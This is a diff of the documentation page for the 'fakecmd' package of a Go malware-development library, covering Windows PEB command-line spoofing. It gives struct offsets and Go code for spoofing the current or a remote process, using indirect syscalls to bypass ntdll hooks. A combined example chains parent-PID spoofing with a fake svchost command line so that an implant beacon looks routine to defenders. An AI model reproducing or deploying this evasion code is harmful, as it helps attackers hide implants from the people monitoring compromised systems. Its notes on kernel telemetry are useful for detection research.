@@ -2,76 +2,179 @@
 
 [<- Back to Evasion](README.md)
 
-## What It Does
+**MITRE ATT&CK:** [T1036.005 - Masquerading: Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005/)
+**Package:** `evasion/fakecmd`
+**Platform:** Windows
+**Detection:** Low
 
-Overwrites the `CommandLine` field in the current process PEB so that usermode
-process-listing tools (Task Manager, Process Explorer, `Get-Process`, WMIC)
-display a fake command line rather than the real one.
+---
+
+## Primer
+
+When a defender lists processes (Task Manager, Process Explorer,
+`Get-Process | Select CommandLine`, Sysmon ProcessCreate event ID 1), the
+command line shown is what each tool reads out of the target process's PEB
+(Process Environment Block), not a separate kernel record.
+
+FakeCmdLine overwrites that PEB field in-memory so every usermode reader sees
+a benign command line — e.g., an implant launched as
+`C:\evil.exe --beacon 1.2.3.4` can present itself as
+`C:\Windows\System32\svchost.exe -k netsvcs`.
+
+The kernel keeps a separate, unmodifiable copy in `EPROCESS` captured at
+process creation, so kernel-sourced telemetry (ETW ProcessStart,
+`PsSetCreateProcessNotifyRoutineEx`) still sees the original — this technique
+fools usermode readers, not every defender.
+
+---
 
 ## How It Works
 
-Every Windows process has a PEB accessible via
-`NtQueryInformationProcess(ProcessBasicInformation)`. The PEB holds a pointer
-to `RTL_USER_PROCESS_PARAMETERS`, whose `CommandLine` is a `UNICODE_STRING`.
-Overwriting its `Length`, `MaximumLength` and `Buffer` fields makes any tool
-that reads this structure see the fake value.
+```mermaid
+sequenceDiagram
+    participant Reader as Process Explorer / Sysmon / EDR
+    participant PEB as Target PEB
+    participant PP as RTL_USER_PROCESS_PARAMETERS
+    participant CmdLine as UNICODE_STRING CommandLine
+    participant Kernel as EPROCESS (kernel)
 
-The kernel's `EPROCESS.SeAuditProcessCreationInfo` is **not** affected —
-kernel EDR callbacks (`PsSetCreateProcessNotifyRoutine`) still see the
-original command line recorded at process creation.
+    Note over PEB,PP: Set up at process creation
+    PP->>CmdLine: Length / MaximumLength / Buffer → "evil.exe --beacon"
+    Kernel-->>Kernel: SeAuditProcessCreationInfo = "evil.exe --beacon" (frozen)
 
-## API
+    Note over PEB,CmdLine: fakecmd.Spoof() overwrites here
+    CmdLine->>CmdLine: Buffer → "svchost.exe -k netsvcs"<br/>Length / MaximumLength updated
 
-```go
-// Spoof overwrites the current process PEB CommandLine.
-func Spoof(fakeCmd string, caller *wsyscall.Caller) error
+    Reader->>PEB: NtQueryInformationProcess(ProcessBasicInformation)
+    Reader->>PP: Follow PEB.ProcessParameters
+    Reader->>CmdLine: Read CommandLine
+    CmdLine-->>Reader: "svchost.exe -k netsvcs"  (fake)
 
-// Restore reverts to the value saved before the first Spoof call.
-func Restore() error
-
-// Current reads the active PEB CommandLine.
-func Current() string
-
-// SpoofPID overwrites a REMOTE process PEB CommandLine via ReadProcessMemory /
-// WriteProcessMemory / NtAllocateVirtualMemory on a handle opened with
-// PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION.
-// No Restore counterpart — track the original string yourself if you need it.
-func SpoofPID(pid uint32, fakeCmd string, caller *wsyscall.Caller) error
+    Reader->>Kernel: Kernel ETW / audit record
+    Kernel-->>Reader: "evil.exe --beacon"        (real)
 ```
 
-## Remote Spoofing
+**Layout:** PEB at `PEB.ProcessParameters` → `RTL_USER_PROCESS_PARAMETERS` at
+offset `+0x20` on x64 → `CommandLine` UNICODE_STRING at `RUPP+0x70`. Overwrite
+`Length`, `MaximumLength`, and `Buffer` to a new UTF-16 string and every
+usermode enumerator sees the new value.
 
-`SpoofPID` applies the same PEB overwrite to another process. The target handle
-must be opened with VM read/write/operate rights, which typically requires the
-caller to hold SeDebugPrivilege or run elevated. The sequence is:
+**Self vs remote:**
+- `Spoof` rewrites the current process's own PEB — no special privilege
+  needed, instant.
+- `SpoofPID` rewrites another process's PEB via
+  `OpenProcess(VM_READ|VM_WRITE|VM_OPERATION|QUERY_INFORMATION)` +
+  `NtQueryInformationProcess` + `NtAllocateVirtualMemory` +
+  `WriteProcessMemory`. Typically requires SeDebugPrivilege or elevation.
 
-1. `OpenProcess` with `PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_VM_OPERATION|PROCESS_QUERY_INFORMATION`
-2. `NtQueryInformationProcess` → PEB address
-3. `ReadProcessMemory` → `ProcessParameters` pointer at PEB+0x20 → `CommandLine` UNICODE_STRING at PP+0x70
-4. `NtAllocateVirtualMemory` in the target for the new UTF-16 buffer
-5. `WriteProcessMemory` the new string, then patch Length / MaximumLength / Buffer of the UNICODE_STRING
-
-Like `Spoof`, only user-mode readers (debuggers, Process Hacker, sysmon ProcessAccess filters) observe the fake value. Kernel `ProcessCreate` audit records are not affected because they were stamped at CreateProcess time.
+---
 
 ## Usage
 
+**Self-spoof:**
+
 ```go
-import "github.com/oioio-space/maldev/evasion/fakecmd"
+import (
+    "log"
+
+    "github.com/oioio-space/maldev/evasion/fakecmd"
+)
 
 if err := fakecmd.Spoof(`C:\Windows\System32\svchost.exe -k netsvcs`, nil); err != nil {
     log.Fatal(err)
 }
 defer fakecmd.Restore()
+
+// From now on, every PEB reader sees svchost.exe -k netsvcs in this process.
 ```
 
-## MITRE ATT&CK
+**Remote spoof (another PID):**
 
-| Technique | ID |
-|-----------|-----|
-| Masquerading: Match Legitimate Name or Location | [T1036.005](https://attack.mitre.org/techniques/T1036/005/) |
+```go
+// Caller needs SeDebugPrivilege. Handles are opened internally.
+err := fakecmd.SpoofPID(
+    targetPID,
+    `C:\Windows\System32\notepad.exe`,
+    nil, // or a wsyscall.Caller for indirect syscalls
+)
+```
 
-## Detection
+**With an indirect-syscall caller** (avoid hooked ntdll when reading/writing
+the PEB):
 
-**Low** — In-memory only. Kernel audit fields unchanged. A defender that
-reads the PEB `CommandLine` in the target process sees the spoof; a defender
-that reads the kernel audit record sees the real command line.
+```go
+import wsyscall "github.com/oioio-space/maldev/win/syscall"
+
+caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHellsGate())
+_ = fakecmd.Spoof(`C:\Windows\System32\svchost.exe -k netsvcs`, caller)
+```
+
+---
+
+## Combined Example
+
+Pair a PPID-spoofed launch (via `c2/shell.PPIDSpoofer`) with a
+`fakecmd.Spoof` in the child so usermode enumerators see a realistic
+`explorer.exe → svchost.exe -k netsvcs` tree instead of
+`cmd.exe → implant.exe --beacon`.
+
+```go
+package main
+
+import (
+    "log"
+    "os"
+    "os/exec"
+
+    "github.com/oioio-space/maldev/c2/shell"
+    "github.com/oioio-space/maldev/evasion/fakecmd"
+)
+
+func main() {
+    if os.Getenv("RESPAWNED") == "" {
+        // Stage 1 — parent: re-launch self with explorer.exe as PPID.
+        sp := shell.NewPPIDSpooferWithTargets([]string{"explorer.exe"})
+        if err := sp.FindTargetProcess(); err != nil {
+            log.Fatal(err)
+        }
+        attr, handle, err := sp.SysProcAttr()
+        if err != nil {
+            log.Fatal(err)
+        }
+        cmd := exec.Command(os.Args[0])
+        cmd.Env = append(os.Environ(), "RESPAWNED=1")
+        cmd.SysProcAttr = attr
+        if err := cmd.Start(); err != nil {
+            log.Fatal(err)
+        }
+        _ = handle // parent keeps the handle alive until Start returns
+        return
+    }
+
+    // Stage 2 — child: rewrite own PEB CommandLine to look like a
+    // Schedule-svchost (a tree branch users see daily).
+    if err := fakecmd.Spoof(
+        `C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule`,
+        nil,
+    ); err != nil {
+        log.Fatal(err)
+    }
+    defer fakecmd.Restore()
+
+    // Usermode collectors now see:
+    //   explorer.exe → svchost.exe -k netsvcs -p -s Schedule
+    runBeacon()
+}
+
+func runBeacon() { /* actual implant work */ }
+```
+
+Defender view: a Schedule-svchost under explorer.exe is a daily sight;
+nothing to investigate. Kernel ETW ProcessCreate still carries the real
+binary path, so defenders ingesting that event source are not fooled.
+
+---
+
+## API Reference
+
+See [evasion.md](../../evasion.md#fakecmd----peb-commandline-spoof)
